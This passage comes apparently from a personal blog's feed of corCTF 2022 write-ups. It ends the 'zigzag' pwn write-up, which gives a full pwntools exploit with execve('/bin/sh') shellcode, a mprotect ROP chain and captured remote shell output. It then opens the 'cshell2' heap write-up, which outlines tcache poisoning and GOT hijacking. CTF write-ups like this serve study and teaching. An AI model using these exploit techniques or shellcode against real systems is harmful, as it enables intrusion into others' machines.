The goal for the ROPchain is to <code>mptotect</code> a shellcode and then jump on it. The issue is that I didn&rsquo;t find a gadget to control the value of the <code>rdx</code> register but when it returns from <code>std.fs.file.File.read</code> it contains the value of size given to <code>edit</code>. So to call <code>mprotect(rdi=0x208000, rsi=0x1000, rdx=0x7)</code> we have to call <code>edit</code> with a size of <code>7</code> to write on the <code>std.fs.file.File.read</code> saved RIP the value of the magic gadget seen previously.</p>
<p>Here is the ROPchain:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="c1"># with the use of the write what were we write the shellcode at 0x208000</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&#34;</span>
<span class="c1"># execve(&#34;/bin/sh&#34;, NULL, NULL)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x0000000000201fcf : pop rax ; syscall
</span><span class="s2">0x0000000000203147 : pop rdi ; ret
</span><span class="s2">0x000000000020351b : pop rsi ; ret
</span><span class="s2">0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
</span><span class="s2">0x0000000000201e09 : ret
</span><span class="s2">0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x50</span><span class="p">)</span><span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="c1"># write ROPchain into the safe area on the stack </span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x203147</span><span class="p">)</span> \ <span class="c1"># pop rdi ; ret</span>
        <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># target area for the shellcode</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20351b</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># pop rsi ; ret</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># length</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x201fcf</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># pop rax ; syscall</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span> <span class="o">+</span> \ <span class="c1"># SYS_mprotect</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">))</span> <span class="c1"># jump on the shellcode + PROFIT</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">)</span><span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x202d16</span><span class="p">))</span> <span class="c1"># valid return address</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000203715</span><span class="p">))</span> <span class="c1"># magic gadget</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
[*] '/home/nasm/Documents/pwn/corCTF/zieg/zigzag'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x200000)
[+] Opening connection to be.ax on port 31278: Done
[*] stack: 0x7ffc2ca48ae8
[*] Loaded 37 cached gadgets for 'zigzag'
[*] Using sigreturn for 'SYS_execve'
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls
flag.txt
zigzag
$ cat flag.txt
corctf{bl4Z1nGlY_f4sT!!}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="appendices">
        Appendices
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#appendices" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Appendices" href="#appendices">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;zigzag&#39;</span><span class="p">)</span>
<span class="c1"># pwn.context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;] </span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Data: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Data: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;vv&#34;</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&#34;</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x0000000000201fcf : pop rax ; syscall
</span><span class="s2">0x0000000000203147 : pop rdi ; ret
</span><span class="s2">0x000000000020351b : pop rsi ; ret
</span><span class="s2">0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
</span><span class="s2">0x0000000000201e09 : ret
</span><span class="s2">0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</span><span class="s2">&#34;&#34;&#34;</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x208000</span><span class="o">+</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x50</span><span class="p">)</span><span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x203147</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20351b</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x201fcf</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">))</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x400</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">)</span><span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x202d16</span><span class="p">))</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000203715</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
</span><span class="s2">[*] &#39;/home/nasm/Documents/pwn/corCTF/zieg/zigzag&#39;
</span><span class="s2">    Arch:     amd64-64-little
</span><span class="s2">    RELRO:    No RELRO
</span><span class="s2">    Stack:    No canary found
</span><span class="s2">    NX:       NX enabled
</span><span class="s2">    PIE:      No PIE (0x200000)
</span><span class="s2">[+] Opening connection to be.ax on port 31278: Done
</span><span class="s2">[*] stack: 0x7ffe21d2cc68
</span><span class="s2">[*] Loaded 37 cached gadgets for &#39;zigzag&#39;
</span><span class="s2">[*] Using sigreturn for &#39;SYS_execve&#39;
</span><span class="s2">[*] Switching to interactive mode
</span><span class="s2">$ id
</span><span class="s2">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
</span><span class="s2">$ cat flag.txt
</span><span class="s2">corctf{bl4Z1nGlY_f4sT!!}
</span><span class="s2">&#34;&#34;&#34;</span>
</code></pre></div>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/corCTF" term="corCTF" label="corCTF" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/zig" term="zig" label="zig" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[corCTF 2022 - pwn] cshell2]]></title>
            <link href="https://nasm.re/posts/cshell2/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/cshell2/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-08-07T00:00:00+00:00</published>
            <updated>2022-08-07T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p><code>cshell2</code> is a heap challenge I did during the <a
  class="gblog-markdown__link"
  href="https://ctftime.org/event/1656"
  
  >corCTF 2022</a
> event. It was pretty classic so I will not describe a lot.
If you begin with heap challenges, I advice you to read <a
  class="gblog-markdown__link"
  href="https://ret2school.github.io/tags/heap/"
  
  >previous heap writeup</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="tl-dr">
        TL; DR
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#tl-dr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL; DR" href="#tl-dr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<ul>
<li>Fill tcache.</li>
<li>Heap overflow in <code>edit</code> on the <code>bio</code> field which allows to leak the address of the unsortedbin.</li>
<li>Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning.</li>
<li>Hiijack GOT entry of <code>free</code> to <code>system</code>.</li>
<li>Call <code>free(&quot;/bin/sh&quot;)</code>.</li>
<li>PROFIT</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="reverse-engineering">
        Reverse Engineering
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#reverse-engineering" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Reverse Engineering" href="#reverse-engineering">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Let&rsquo;s take a look at the provided binary and libc:</p>
<pre tabindex="0"><code>$ ./libc.so.6 
GNU C Library (GNU libc) development release version 2.36.9000.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 12.1.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/libc/bugs.html&gt;.
$ checksec --file cshell2
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
</code></pre><p>A very recent libc plus a non PIE-based binary without <code>FULL RELRO</code>. Thus we could think to some GOT hiijacking stuff directly on the binary. Let&rsquo;s take a look at the <code>add</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">add</span><span class="p">()</span>
<span class="p">{</span>
